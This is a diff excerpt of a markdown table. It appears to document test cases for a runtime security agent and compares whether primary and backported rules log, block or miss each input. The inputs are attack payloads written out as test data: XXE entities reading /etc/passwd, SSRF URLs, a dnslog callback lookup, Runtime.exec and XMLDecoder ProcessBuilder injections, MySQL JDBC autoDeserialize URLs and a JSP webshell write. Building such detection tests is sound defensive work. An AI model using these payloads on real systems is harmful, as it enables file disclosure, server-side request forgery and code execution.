-| [xxe_file](../rules/cases/xxe_file.toml) `passwd-entity-outside-request` | sink | `xml.parse <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>` | log `xxe_file` (also `xxe_protocol`) | block `xxe_external_entity_protocol` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
-| [xxe_protocol](../rules/cases/xxe_protocol.toml) `external-dtd` | sink | `xml.parse <?xml version="1.0"?><!DOCTYPE r SYSTEM "http://127.0.0.1:{port}/ext.dtd"><r>&remote;</r>` | log `xxe_protocol` | block `xxe_external_entity_protocol` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
-| [xxe_protocol](../rules/cases/xxe_protocol.toml) `http-entity-outside-request` | sink | `xml.parse <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:{port}/entity.txt">]><r>&x;</r>` | log `xxe_protocol` | block `xxe_external_entity_protocol` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
+| [xpath_runtime](../rules/cases/xpath_runtime.toml) `runtime-exec-extension-outside-request` | sink | `xpath.evaluate rt:exec(rt:getRuntime(), 'id')` | block `xpath_runtime` | unreachable | backport: the backports have no XPath expression rule |
 
 ### Primary log, backports unreachable
 
 | Case | Path | Input | Primary | Backports | Why |
 |---|---|---|---|---|---|
-| [command_dnslog](../rules/cases/command_dnslog.toml) `callback-domain-lookup` | sink | `process.exec /nonexistent/rule-case/nslookup abc123.dnslog.cn` | log `command_dnslog` | unreachable | primary: the primary blocks this only inside an HTTP request; outside one it logs; backport: the backports have no list of callback domains for process arguments |
-| [command_error](../rules/cases/command_error.toml) `unclosed-quote` | sink | `process.exec sh -c echo 'unclosed` | log `command_error` | unreachable | primary: the primary blocks this only inside an HTTP request; outside one it logs; backport: the backports do not check the quoting of a shell program |
-| [ssrf_common](../rules/cases/ssrf_common.toml) `callback-domain-outside-request` | sink | `net.open http://abc123.dnslog.cn/` | log `ssrf_common` | unreachable | primary: the primary blocks this only inside an HTTP request; outside one it logs; backport: the backports have no list of callback domains for outbound URLs |
-| [ssrf_obfuscate](../rules/cases/ssrf_obfuscate.toml) `hex-loopback-outside-request` | sink | `net.open http://0x7f000001:{port}/` | log `ssrf_obfuscate` | unreachable | primary: the primary blocks this only inside an HTTP request; outside one it logs; backport: the backports do not check how an outbound host is written |
-| [ssrf_protocol](../rules/cases/ssrf_protocol.toml) `ftp-url-outside-request` | sink | `net.open ftp://127.0.0.1:1/etc/passwd` | log `ssrf_protocol` | unreachable | primary: the primary blocks this only inside an HTTP request; outside one it logs; backport: the backports check outbound HTTP destinations only, not the URL scheme |
-| [xpath_runtime](../rules/cases/xpath_runtime.toml) `runtime-exec-extension-outside-request` | sink | `xpath.evaluate rt:exec(rt:getRuntime(), 'id')` | log `xpath_runtime` | unreachable | primary: the primary blocks this only inside an HTTP request; outside one it logs; backport: the backports have no XPath expression rule |
-
-### Primary none, backports block
-
-| Case | Path | Input | Primary | Backports | Why |
-|---|---|---|---|---|---|
-| [java_compile_runtime](../rules/cases/java_compile_runtime.toml) `runtime-exec-source-outside-request` | sink | `java.compile public class Generated { public void run() throws Exception { Runtime.getRuntime().exec("id"); } }` | none | block `java_compile_runtime_execution` | primary: the primary decides compilation only inside an HTTP request |
-| [jdbc_mysql_deserialization](../rules/cases/jdbc_mysql_deserialization.toml) `mysql-autodeserialize-in-request` | request-sink | `GET /app/report?id=7; jdbc.connect jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInt...` | none | block `jdbc_mysql_deserialization` | primary: the primary flags this URL only when a request parameter carries it; this request does not |
-| [jdbc_mysql_deserialization](../rules/cases/jdbc_mysql_deserialization.toml) `mysql-autodeserialize-outside-request` | sink | `jdbc.connect jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor` | none | block `jdbc_mysql_deserialization` | primary: the primary flags this URL only when a request parameter carries it; outside a request there is none |
-| [readFile_unwanted](../rules/cases/readFile_unwanted.toml) `passwd-read-nio` | sink | `file.read (Files.readAllBytes) /etc/passwd` | none | block `file_sensitive_read` | primary: the primary decides sensitive host reads only inside an HTTP request |
-| [readFile_unwanted](../rules/cases/readFile_unwanted.toml) `passwd-read-outside-request` | sink | `file.read /etc/passwd` | none | block `file_sensitive_read` | primary: the primary decides sensitive host reads only inside an HTTP request |
-| [writeFile_script](../rules/cases/writeFile_script.toml) `jsp-in-webroot-nio` | sink | `file.write (Files.write) {tmp}/webapps/ROOT/shell.jsp, <%= 1 %>` | none | block `file_script_write` | primary: the primary decides script writes only inside an HTTP request |
-| [writeFile_script](../rules/cases/writeFile_script.toml) `jsp-in-webroot-outside-request` | sink | `file.write {tmp}/webapps/ROOT/shell.jsp, <%= 1 %>` | none | block `file_script_write` | primary: the primary decides script writes only inside an HTTP request |
-| [xml_decoder_runtime](../rules/cases/xml_decoder_runtime.toml) `process-builder-outside-request` | sink | `beans.decode <?xml version="1.0"?><java><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="2"><void index="0"><string>echo</str...` | none | block `xml_decoder_runtime_execution` | primary: the primary decides XMLDecoder statements only inside an HTTP request |
-| [xml_decoder_webshell](../rules/cases/xml_decoder_webshell.toml) `print-writer-jsp-outside-request` | sink | `beans.decode <?xml version="1.0"?><java><object class="java.io.PrintWriter"><string>{tmp}/webapps/ROOT/d.jsp</string><void method="println"><string>&lt;%= 1 ...` | none | block `xml_decoder_script_file_write` | primary: the primary decides XMLDecoder statements only inside an HTTP request |
+| [ssrf_obfuscate](../rules/cases/ssrf_obfuscate.toml) `hex-loopback-outside-request` | sink | `net.open http://0x7f000001:{port}/` | log `ssrf_obfuscate` | unreachable | primary: the primary blocks this only inside an HTTP request: ssrf_obfuscate is one of the rules too broad to block without a request that supplied the input, on every line that has it; backport: the backports do not check how an outbound host is written |
+| [ssrf_protocol](../rules/cases/ssrf_protocol.toml) `ftp-url-outside-request` | sink | `net.open ftp://127.0.0.1:1/etc/passwd` | log `ssrf_protocol` | unreachable | primary: the primary blocks this only inside an HTTP request: ssrf_protocol is one of the rules too broad to block without a request that supplied the input, on every line that has it; backport: the backports check outbound HTTP destinations only, not the URL scheme |
 
 ### Primary none, backports unreachable
 
